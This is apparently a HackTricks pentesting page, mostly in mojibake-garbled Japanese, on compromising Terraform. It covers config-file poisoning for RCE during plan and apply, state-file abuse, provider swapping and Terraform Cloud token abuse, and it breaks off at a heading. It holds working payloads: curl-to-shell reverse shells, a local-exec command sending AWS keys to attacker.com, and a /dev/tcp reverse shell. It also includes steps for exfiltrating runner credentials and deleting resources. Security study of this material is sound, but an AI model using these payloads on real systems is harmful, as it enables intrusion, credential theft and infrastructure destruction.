# Terraform ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£

{{#include ../banners/hacktricks-training.md}}

## åŸºæœ¬æƒ…å ±

[ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚ˆã‚Š:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform ã¯ **ã‚¤ãƒ³ãƒ•ãƒ©ã‚¹ãƒˆãƒ©ã‚¯ãƒãƒ£ã‚’ã‚³ãƒ¼ãƒ‰ã¨ã—ã¦å®šç¾©ã™ã‚‹ãƒ„ãƒ¼ãƒ«** ã§ã€**ã‚¯ãƒ©ã‚¦ãƒ‰ãŠã‚ˆã³ã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹ã®ãƒªã‚½ãƒ¼ã‚¹** ã‚’ãƒãƒ¼ã‚¸ãƒ§ãƒ³ç®¡ç†ã€å†åˆ©ç”¨ã€å…±æœ‰ã§ãã‚‹äººé–“ãŒèª­ã¿ã‚„ã™ã„æ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«ã§å®šç¾©ã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ä¸€è²«ã—ãŸãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã§ã‚¤ãƒ³ãƒ•ãƒ©å…¨ä½“ã‚’ãƒ©ã‚¤ãƒ•ã‚µã‚¤ã‚¯ãƒ«ã‚’é€šã˜ã¦ãƒ—ãƒ­ãƒ“ã‚¸ãƒ§ãƒ‹ãƒ³ã‚°ãŠã‚ˆã³ç®¡ç†ã§ãã¾ã™ã€‚Terraform ã¯ computeã€storageã€networking ã®ã‚ˆã†ãªä½ãƒ¬ãƒ™ãƒ«ã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã ã‘ã§ãªãã€DNS ã‚¨ãƒ³ãƒˆãƒªã‚„ SaaS æ©Ÿèƒ½ã®ã‚ˆã†ãªé«˜ãƒ¬ãƒ™ãƒ«ã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚‚ç®¡ç†ã§ãã¾ã™ã€‚

#### Terraform ã¯ã©ã®ã‚ˆã†ã«å‹•ä½œã™ã‚‹ã‹ï¼Ÿ

Terraform ã¯ã‚¯ãƒ©ã‚¦ãƒ‰ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã‚„ä»–ã®ã‚µãƒ¼ãƒ“ã‚¹ã® API ã‚’é€šã˜ã¦ãƒªã‚½ãƒ¼ã‚¹ã‚’ä½œæˆãƒ»ç®¡ç†ã—ã¾ã™ã€‚ãƒ—ãƒ­ãƒã‚¤ãƒ€ã¯ã€ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ãª API ã‚’æŒã¤ã»ã¼ã™ã¹ã¦ã®ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã‚„ã‚µãƒ¼ãƒ“ã‚¹ã¨ Terraform ã‚’é€£æºã•ã›ã¾ã™ã€‚

![](<../images/image (177).png>)

HashiCorp ã¨ Terraform ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã¯æ—¢ã« **1700 ã‚’è¶…ãˆã‚‹ãƒ—ãƒ­ãƒã‚¤ãƒ€** ã‚’ä½œæˆã—ã¦ãŠã‚Šã€ã•ã¾ã–ã¾ãªã‚¿ã‚¤ãƒ—ã®ãƒªã‚½ãƒ¼ã‚¹ã‚„ã‚µãƒ¼ãƒ“ã‚¹ã‚’ç®¡ç†ã—ã¦ã„ã¾ã™ã€‚ã“ã®æ•°ã¯å¢—ãˆç¶šã‘ã¦ã„ã¾ã™ã€‚å…¬é–‹ã•ã‚Œã¦ã„ã‚‹ãƒ—ãƒ­ãƒã‚¤ãƒ€ã¯ã™ã¹ã¦ [Terraform Registry](https://registry.terraform.io/) ã§ç¢ºèªã§ãã€Amazon Web Services (AWS)ã€Azureã€Google Cloud Platform (GCP)ã€Kubernetesã€Helmã€GitHubã€Splunkã€DataDog ãªã©ãŒå«ã¾ã‚Œã¾ã™ã€‚

Terraform ã®ã‚³ã‚¢ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã¯æ¬¡ã®3ã¤ã®æ®µéšã§æ§‹æˆã•ã‚Œã¾ã™ï¼š

- **Write:** è¤‡æ•°ã®ã‚¯ãƒ©ã‚¦ãƒ‰ãƒ—ãƒ­ãƒã‚¤ãƒ€ã‚„ã‚µãƒ¼ãƒ“ã‚¹ã«ã¾ãŸãŒã‚‹ãƒªã‚½ãƒ¼ã‚¹ã‚’å®šç¾©ã—ã¾ã™ã€‚ä¾‹ãˆã°ã€VPC ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å†…ã®ä»®æƒ³ãƒã‚·ãƒ³ã«ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ãƒ‡ãƒ—ãƒ­ã‚¤ã—ã€security groups ã¨ load balancer ã‚’æ§‹æˆã™ã‚‹è¨­å®šã‚’ä½œæˆã™ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚
- **Plan:** Terraform ã¯ã€æ—¢å­˜ã®ã‚¤ãƒ³ãƒ•ãƒ©ã¨ã‚ãªãŸã®è¨­å®šã«åŸºã¥ã„ã¦ã€ä½œæˆãƒ»æ›´æ–°ãƒ»ç ´æ£„ã•ã‚Œã‚‹ã‚¤ãƒ³ãƒ•ãƒ©ã‚’è¨˜è¿°ã™ã‚‹å®Ÿè¡Œãƒ—ãƒ©ãƒ³ã‚’ä½œæˆã—ã¾ã™ã€‚
- **Apply:** æ‰¿èªã•ã‚Œã‚‹ã¨ã€Terraform ã¯ãƒªã‚½ãƒ¼ã‚¹ä¾å­˜é–¢ä¿‚ã‚’å°Šé‡ã—ã¦é©åˆ‡ãªé †åºã§ææ¡ˆã•ã‚ŒãŸæ“ä½œã‚’å®Ÿè¡Œã—ã¾ã™ã€‚ä¾‹ãˆã°ã€VPC ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’æ›´æ–°ã—ã¦ãã® VPC å†…ã®ä»®æƒ³ãƒã‚·ãƒ³ã®æ•°ã‚’å¤‰æ›´ã—ãŸå ´åˆã€Terraform ã¯ä»®æƒ³ãƒã‚·ãƒ³ã‚’ã‚¹ã‚±ãƒ¼ãƒ«ã™ã‚‹å‰ã« VPC ã‚’å†ä½œæˆã—ã¾ã™ã€‚

![](<../images/image (215).png>)

### Terraform ãƒ©ãƒœ

å˜ã«ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã« Terraform ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¦ãã ã•ã„ã€‚

ã“ã¡ã‚‰ã« [ã‚¬ã‚¤ãƒ‰](https://learn.hashicorp.com/tutorials/terraform/install-cli) ãŒã‚ã‚Šã€ã“ã¡ã‚‰ãŒ [Terraform ã®ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰æ–¹æ³•ï¼ˆæ¨å¥¨ï¼‰](https://www.terraform.io/downloads) ã§ã™ã€‚

## RCE in Terraform: config file poisoning

Terraform **doesn't have a platform exposing a web page or a network service** we can enumerate, therefore, the only way to compromise terraform is to **be able to add/modify terraform configuration files** or to **be able to modify the terraform state file** (see chapter below).

However, terraform is a **very sensitive component** to compromise because it will have **privileged access** to different locations so it can work properly.

The main way for an attacker to be able to compromise the system where terraform is running is to **compromise the repository that stores terraform configurations**, because at some point they are going to be **interpreted**.

Actually, there are solutions out there that **execute terraform plan/apply automatically after a PR** is created, such as **Atlantis**:

{{#ref}}
atlantis-security.md
{{#endref}}

If you are able to compromise a terraform file there are different ways you can perform RCE when someone executed `terraform plan` or `terraform apply`.

### Terraform plan

Terraform plan is the **most used command** in terraform and developers/solutions using terraform call it all the time, so the **easiest way to get RCE** is to make sure you poison a terraform config file that will execute arbitrary commands in a `terraform plan`.

**Using an external provider**

Terraform offers the [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs) which provides a way to interface between Terraform and external programs. You can use the `external` data source to run arbitrary code during a `plan`.

Injecting in a terraform config file something like the following will execute a rev shell when executing `terraform plan`:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**ã‚«ã‚¹ã‚¿ãƒ ãƒ—ãƒ­ãƒã‚¤ãƒ€ã®ä½¿ç”¨**

æ”»æ’ƒè€…ã¯ [custom provider](https://learn.hashicorp.com/tutorials/terraform/provider-setup) ã‚’ [Terraform Registry](https://registry.terraform.io/) ã«æå‡ºã—ã€ãã®å¾Œ feature branch ã® Terraform ã‚³ãƒ¼ãƒ‰ã«ãã‚Œã‚’è¿½åŠ ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆ[example from here](https://alex.kaskaso.li/post/terraform-plan-rce)ï¼‰ï¼š
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
ãƒ—ãƒ­ãƒã‚¤ãƒ€ã¯ `init` æ™‚ã«ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã€`plan` ãŒå®Ÿè¡Œã•ã‚Œã‚‹ã¨æ‚ªæ„ã®ã‚ã‚‹ã‚³ãƒ¼ãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã¾ã™

You can find an example in [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

**å¤–éƒ¨å‚ç…§ã®åˆ©ç”¨**

ã©ã¡ã‚‰ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚‚æœ‰ç”¨ã§ã™ãŒã€ã‚ã¾ã‚Šstealthyã§ã¯ã‚ã‚Šã¾ã›ã‚“ï¼ˆ2ã¤ç›®ã®æ–¹ãŒ1ã¤ç›®ã‚ˆã‚Šstealthyã§ã™ãŒã€ã‚ˆã‚Šè¤‡é›‘ã§ã™ï¼‰ã€‚æ¬¡ã®ææ¡ˆã«å¾“ã†ã“ã¨ã§ã€ã“ã®æ”»æ’ƒã‚’ã•ã‚‰ã«**stealthier way**ã§è¡Œã†ã“ã¨ãŒã§ãã¾ã™ï¼š

- terraformãƒ•ã‚¡ã‚¤ãƒ«ã«rev shellã‚’ç›´æ¥è¿½åŠ ã™ã‚‹ä»£ã‚ã‚Šã«ã€rev shellã‚’å«ã‚€**å¤–éƒ¨ãƒªã‚½ãƒ¼ã‚¹ã‚’èª­ã¿è¾¼ã‚€**ã“ã¨ãŒã§ãã¾ã™ï¼š
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
You can find the rev shell code in [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules)

- å¤–éƒ¨ãƒªã‚½ãƒ¼ã‚¹ã§ã¯ã€**ref** æ©Ÿèƒ½ã‚’ä½¿ã£ã¦ãƒªãƒã‚¸ãƒˆãƒªå†…ã®ãƒ–ãƒ©ãƒ³ãƒã«ã‚ã‚‹ **terraform rev shell code in a branch** ã‚’éš ã—ã¾ã™ã€‚ä¾‹ãˆã°: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply ã¯ã™ã¹ã¦ã®å¤‰æ›´ã‚’åæ˜ ã™ã‚‹ãŸã‚ã«å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚ã¾ãŸã€[**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html) ã‚’ä½¿ã£ãŸ **a malicious Terraform file with** ã‚’æ³¨å…¥ã—ã¦ RCE ã‚’å¾—ã‚‹ã‚ˆã†ã«æ‚ªç”¨ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚\
æ¬¡ã®ã‚ˆã†ãªãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒ `main.tf` ãƒ•ã‚¡ã‚¤ãƒ«ã«å«ã¾ã‚Œã‚‹ã‚ˆã†ã«ã™ã‚Œã°ã‚ˆã„ã§ã™:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
å‰ã®æ‰‹æ³•ã‹ã‚‰ã®**ææ¡ˆã«å¾“ã„**ã€**å¤–éƒ¨å‚ç…§ã‚’ä½¿ç”¨ã—ã¦ã‚ˆã‚Šã‚¹ãƒ†ãƒ«ã‚¹ã«å®Ÿè¡Œã™ã‚‹**ã“ã¨ã§ã“ã®æ”»æ’ƒã‚’è¡Œã£ã¦ãã ã•ã„ã€‚

## ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã®ãƒ€ãƒ³ãƒ—

terraform ãƒ•ã‚¡ã‚¤ãƒ«ã«æ¬¡ã®ã‚ˆã†ãªã‚‚ã®ã‚’è¿½åŠ ã—ã€`terraform apply` ã‚’å®Ÿè¡Œã™ã‚‹ã¨ã€terraform ãŒä½¿ç”¨ã™ã‚‹**ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆå€¤ã‚’ãƒ€ãƒ³ãƒ—ã•ã›ã‚‹**ã“ã¨ãŒã§ãã¾ã™:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Terraform State Filesã®æ‚ªç”¨

terraform state files ã«å¯¾ã—ã¦æ›¸ãè¾¼ã¿æ¨©é™ãŒã‚ã‚‹ãŒ terraform ã®ã‚³ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã§ããªã„å ´åˆã€[**this research**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) ã¯ãã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’åˆ©ç”¨ã™ã‚‹ãŸã‚ã®èˆˆå‘³æ·±ã„æ–¹æ³•ã‚’ã„ãã¤ã‹ç´¹ä»‹ã—ã¦ã„ã¾ã™ã€‚ãŸã¨ãˆ config files ã«æ›¸ãè¾¼ã¿æ¨©é™ãŒã‚ã£ã¦ã‚‚ã€state files ã‚’ä½¿ã†ãƒ™ã‚¯ã‚¿ãƒ¼ã®æ–¹ãŒç—•è·¡ã‚’æ®‹ã•ãšã«æ¸ˆã‚€ã“ã¨ãŒå¤šãã€`git` ã®å±¥æ­´ã«è¨˜éŒ²ãŒæ®‹ã‚Šã¾ã›ã‚“ã€‚

### RCE in Terraform: config file poisoning

It is possible to [create a custom provider](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) and just replace one of the providers in the terraform state file for the malicious one or add a fake resource referencing the malicious provider.

The provider [statefile-rce](https://registry.terraform.io/providers/offensive-actions/statefile-rce/latest) builds on the research and weaponizes this principle. You can add a fake resource and state the arbitrary bash command you want to run in the attribute `command`. When the `terraform` run is triggered, this will be read and executed in both the `terraform plan` and `terraform apply` steps. In case of the `terraform apply` step, `terraform` will delete the fake resource from the state file after executing your command, cleaning up after itself. More information and a full demo can be found in the [GitHub repository hosting the source code for this provider](https://github.com/offensive-actions/terraform-provider-statefile-rce).

To use it directly, just include the following at any position of the `resources` array and customize the `name` and the `command` attributes:
```json
{
"mode": "managed",
"type": "rce",
"name": "<arbitrary_name>",
"provider": "provider[\"registry.terraform.io/offensive-actions/statefile-rce\"]",
"instances": [
{
"schema_version": 0,
"attributes": {
"command": "<arbitrary_command>",
"id": "rce"
},
"sensitive_attributes": [],
"private": "bnVsbA=="
}
]
}
```
ãã—ã¦ã€`terraform` ãŒå®Ÿè¡Œã•ã‚Œã‚‹ã¨ã™ãã«ã€ã‚ãªãŸã®ã‚³ãƒ¼ãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã¾ã™ã€‚

### ãƒªã‚½ãƒ¼ã‚¹ã®å‰Šé™¤ <a href="#deleting-resources" id="deleting-resources"></a>

ãƒªã‚½ãƒ¼ã‚¹ã‚’ç ´æ£„ã™ã‚‹æ–¹æ³•ã¯2ã¤ã‚ã‚Šã¾ã™ï¼š

1. **ç ´æ£„å¯¾è±¡ã®å®Ÿéš›ã®ãƒªã‚½ãƒ¼ã‚¹ã‚’æŒ‡ã™ã€ãƒ©ãƒ³ãƒ€ãƒ ãªåå‰ã®ãƒªã‚½ãƒ¼ã‚¹ã‚’state ãƒ•ã‚¡ã‚¤ãƒ«ã«æŒ¿å…¥ã™ã‚‹**

terraform ã¯ãã®ãƒªã‚½ãƒ¼ã‚¹ãŒå­˜åœ¨ã™ã¹ãã§ãªã„ã¨åˆ¤æ–­ã™ã‚‹ãŸã‚ã€å®Ÿéš›ã®ãƒªã‚½ãƒ¼ã‚¹ ID ã«å¾“ã£ã¦ãã‚Œã‚’ç ´æ£„ã—ã¾ã™ã€‚å‰ãƒšãƒ¼ã‚¸ã®ä¾‹ï¼š
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **æ›´æ–°ã§ããªã„ã‚ˆã†ã«ãƒªã‚½ãƒ¼ã‚¹ã‚’å¤‰æ›´ã—ã¦å‰Šé™¤ã•ã›ã‚‹ï¼ˆã¤ã¾ã‚Šå‰Šé™¤ã•ã‚Œã¦å†ä½œæˆã•ã‚Œã‚‹ï¼‰**

EC2 ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®å ´åˆã€ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚¿ã‚¤ãƒ—ã‚’å¤‰æ›´ã™ã‚‹ã ã‘ã§ terraform ãŒå‰Šé™¤ã—ã¦å†ä½œæˆã—ã¾ã™ã€‚

### ãƒ–ãƒ©ãƒƒã‚¯ãƒªã‚¹ãƒˆåŒ–ã•ã‚ŒãŸãƒ—ãƒ­ãƒã‚¤ãƒ€ã‚’ç½®ãæ›ãˆã‚‹

ã‚‚ã— `hashicorp/external` ãŒãƒ–ãƒ©ãƒƒã‚¯ãƒªã‚¹ãƒˆã«ç™»éŒ²ã•ã‚Œã¦ã„ã‚‹å ´åˆã€ä»¥ä¸‹ã®æ‰‹é †ã§ `external` ãƒ—ãƒ­ãƒã‚¤ãƒ€ã‚’å†å®Ÿè£…ã§ãã¾ã™ã€‚æ³¨æ„: https://registry.terraform.io/providers/nazarewk/external/latest ã«å…¬é–‹ã•ã‚Œã¦ã„ã‚‹ external provider ã®ãƒ•ã‚©ãƒ¼ã‚¯ã‚’ä½¿ç”¨ã—ã¦ã„ã¾ã™ã€‚è‡ªåˆ†ã®ãƒ•ã‚©ãƒ¼ã‚¯ã‚„å†å®Ÿè£…ã‚’å…¬é–‹ã—ã¦ã‚‚æ§‹ã„ã¾ã›ã‚“ã€‚
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
ãã®å¾Œã€é€šå¸¸ã©ãŠã‚Š `external` ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Terraform Cloud speculative plan ã«ã‚ˆã‚‹ RCE ã¨ credential exfiltration

ã“ã®ã‚·ãƒŠãƒªã‚ªã¯ Terraform Cloud (TFC) ã® runners ã‚’ speculative plans ã®é–“ã«æ‚ªç”¨ã—ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®ã‚¯ãƒ©ã‚¦ãƒ‰ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¸ãƒ”ãƒœãƒƒãƒˆã—ã¾ã™ã€‚

- Preconditions:
- é–‹ç™ºè€…ã®ãƒã‚·ãƒ³ã‹ã‚‰ Terraform Cloud ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã‚€ã€‚CLI ã¯ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ãƒ—ãƒ¬ãƒ¼ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã§ `~/.terraform.d/credentials.tfrc.json` ã«ä¿å­˜ã—ã¦ã„ã‚‹ã€‚
- ãã®ãƒˆãƒ¼ã‚¯ãƒ³ã¯ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã® organization/workspace ã¸ã‚¢ã‚¯ã‚»ã‚¹ã§ãã€å°‘ãªãã¨ã‚‚ `plan` æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚‹ã€‚VCS-backed workspaces ã¯ CLI ã‹ã‚‰ã® `apply` ã‚’ãƒ–ãƒ­ãƒƒã‚¯ã™ã‚‹ãŒã€ãã‚Œã§ã‚‚ speculative plans ã¯è¨±å¯ã™ã‚‹ã€‚

- TFC API ã‚’ç”¨ã„ã¦ workspace ã¨ VCS è¨­å®šã‚’ç¢ºèªã™ã‚‹:
```bash
export TF_TOKEN=<stolen_token>
curl -s -H "Authorization: Bearer $TF_TOKEN" \
https://app.terraform.io/api/v2/organizations/<org>/workspaces/<workspace> | jq
```
- external data source ã¨ Terraform Cloud "cloud" ãƒ–ãƒ­ãƒƒã‚¯ã‚’ä½¿ç”¨ã—ã¦ VCS-backed workspace ã‚’ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã«ã—ã€speculative plan ã®å®Ÿè¡Œä¸­ã«ã‚³ãƒ¼ãƒ‰å®Ÿè¡Œã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹:
```hcl
terraform {
cloud {
organization = "acmecorp"
workspaces { name = "gcp-infra-prod" }
}
}

data "external" "exec" {
program = ["bash", "./rsync.sh"]
}
```
TFC runnerä¸Šã§reverse shellã‚’å–å¾—ã™ã‚‹ãŸã‚ã®rsync.shã®ä¾‹:
```bash
#!/usr/bin/env bash
bash -c 'exec bash -i >& /dev/tcp/attacker.com/19863 0>&1'
```
ã‚¨ãƒ•ã‚§ãƒ¡ãƒ©ãƒ«ãƒ©ãƒ³ãƒŠãƒ¼ä¸Šã§ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®è©¦è¡Œçš„ãƒ—ãƒ©ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹ï¼š
```bash
terraform init
terraform plan
```
- ãƒ©ãƒ³ãƒŠãƒ¼ã‹ã‚‰æ³¨å…¥ã•ã‚ŒãŸã‚¯ãƒ©ã‚¦ãƒ‰èªè¨¼æƒ…å ±ã‚’åˆ—æŒ™ã—ã¦æŒã¡å‡ºã™ã€‚å®Ÿè¡Œä¸­ã€TFC ã¯ãƒ•ã‚¡ã‚¤ãƒ«ã¨ç’°å¢ƒå¤‰æ•°ã‚’ä»‹ã—ã¦ãƒ—ãƒ­ãƒã‚¤ãƒ€èªè¨¼æƒ…å ±ã‚’æ³¨å…¥ã—ã¾ã™:
```bash
env | grep -i gcp || true
env | grep -i aws || true
```
ãƒ©ãƒ³ãƒŠãƒ¼ã®ä½œæ¥­ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«æœŸå¾…ã•ã‚Œã‚‹ãƒ•ã‚¡ã‚¤ãƒ«:
- GCP:
- `tfc-google-application-credentials` (Workload Identity Federation ã® JSON è¨­å®š)
- `tfc-gcp-token` (çŸ­æœŸã® GCP ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³)
- AWS:
- `tfc-aws-shared-config` (web identity/OIDC ãƒ­ãƒ¼ãƒ«å¼•å—è¨­å®š)
- `tfc-aws-token` (çŸ­æœŸãƒˆãƒ¼ã‚¯ãƒ³; ä¸€éƒ¨ã®çµ„ç¹”ã¯é™çš„ã‚­ãƒ¼ã‚’ä½¿ç”¨ã™ã‚‹å ´åˆã‚ã‚Š)

- çŸ­æœŸã®èªè¨¼æƒ…å ±ã‚’åˆ¥çµŒè·¯ã§ä½¿ç”¨ã—ã¦ VCS ã®ã‚²ãƒ¼ãƒˆã‚’å›é¿ã™ã‚‹:

GCP (gcloud):
```bash
export GOOGLE_APPLICATION_CREDENTIALS=./tfc-google-application-credentials
gcloud auth login --cred-file="$GOOGLE_APPLICATION_CREDENTIALS"
gcloud config set project <PROJECT_ID>
```
AWS (AWS CLI):
```bash
export AWS_CONFIG_FILE=./tfc-aws-shared-config
export AWS_PROFILE=default
aws sts get-caller-identity
```
ã“ã‚Œã‚‰ã®èªè¨¼æƒ…å ±ã‚’ä½¿ã†ã¨ã€æ”»æ’ƒè€…ã¯ãƒã‚¤ãƒ†ã‚£ãƒ–CLIã‚’ç›´æ¥ä½¿ã£ã¦ãƒªã‚½ãƒ¼ã‚¹ã‚’ä½œæˆ/å¤‰æ›´/å‰Šé™¤ã§ãã€VCSçµŒç”±ã§ã®`apply`ã‚’ãƒ–ãƒ­ãƒƒã‚¯ã™ã‚‹PRãƒ™ãƒ¼ã‚¹ã®ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚’å›é¿ã§ãã¾ã™ã€‚

- Defensive guidance:
- TFC ãƒ¦ãƒ¼ã‚¶ãƒ¼/ãƒãƒ¼ãƒ ãŠã‚ˆã³ãƒˆãƒ¼ã‚¯ãƒ³ã«ã¯æœ€å°æ¨©é™ã®åŸå‰‡ã‚’é©ç”¨ã™ã‚‹ã€‚ãƒ¡ãƒ³ãƒãƒ¼ã‚·ãƒƒãƒ—ã‚’ç›£æŸ»ã—ã€éå‰°ãªæ¨©é™ã‚’æŒã¤ã‚ªãƒ¼ãƒŠãƒ¼ã‚’é¿ã‘ã‚‹ã€‚
- å¯èƒ½ãªå ´åˆã€æ©Ÿå¯†æ€§ã®é«˜ã„VCS-backedãƒ¯ãƒ¼ã‚¯ã‚¹ãƒšãƒ¼ã‚¹ã§ã¯`plan`æ¨©é™ã‚’åˆ¶é™ã™ã‚‹ã€‚
- Sentinel ãƒãƒªã‚·ãƒ¼ã§ provider/data source ã® allowlists ã‚’å¼·åˆ¶ã—ã€`data "external"` ã‚„ä¸æ˜ãªãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã‚’ãƒ–ãƒ­ãƒƒã‚¯ã™ã‚‹ã€‚provider ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã«é–¢ã™ã‚‹ HashiCorp ã®ã‚¬ã‚¤ãƒ€ãƒ³ã‚¹ã‚’å‚ç…§ã™ã‚‹ã€‚
- é™çš„ãªã‚¯ãƒ©ã‚¦ãƒ‰è³‡æ ¼æƒ…å ±ã‚ˆã‚Šã‚‚ OIDC/WIF ã‚’å„ªå…ˆã™ã‚‹ã€‚runners ã‚’æ©Ÿå¯†ã¨ã¿ãªã—ã€æŠ•æ©Ÿçš„ãª plan å®Ÿè¡Œã‚„äºˆæœŸã—ãªã„ egress ã‚’ç›£è¦–ã™ã‚‹ã€‚
- `tfc-*` èªè¨¼æƒ…å ±ã‚¢ãƒ¼ãƒ†ã‚£ãƒ•ã‚¡ã‚¯ãƒˆã®æŒã¡å‡ºã— (exfiltration) ã‚’æ¤œå‡ºã—ã€plan å®Ÿè¡Œä¸­ã®ç–‘ã‚ã—ã„ `external` ãƒ—ãƒ­ã‚°ãƒ©ãƒ ä½¿ç”¨ã‚’ã‚¢ãƒ©ãƒ¼ãƒˆã™ã‚‹ã€‚


## Terraform Cloud ã®ä¾µå®³

### ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã™ã‚‹

**[explained in this post](https://www.pentestpartners.com/security-blog/terraform-token-abuse-speculative-plan/)** ã®èª¬æ˜ã®ã¨ãŠã‚Šã€terraform CLI ã¯ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ãƒ—ãƒ¬ãƒ¼ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã§ **`~/.terraform.d/credentials.tfrc.json`** ã«ä¿å­˜ã—ã¾ã™ã€‚ã“ã‚Œã‚’ç›—ã‚€ã¨æ”»æ’ƒè€…ã¯ãƒˆãƒ¼ã‚¯ãƒ³ã®ã‚¹ã‚³ãƒ¼ãƒ—å†…ã§ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ãªã‚Šã™ã¾ã™ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€æ¬¡ã®ã‚ˆã†ã« org/workspace ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™:
```bash
GET https://app.terraform.io/api/v2/organizations/acmecorp/workspaces/gcp-infra-prod
Authorization: Bearer <TF_TOKEN>
```
å‰ç« ã§èª¬æ˜ã—ãŸã‚ˆã†ã«ã€**`terraform plan`** ã‚’ä½¿ç”¨ã—ã¦ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

### ã‚¯ãƒ©ã‚¦ãƒ‰ã¸ã®è„±å‡º

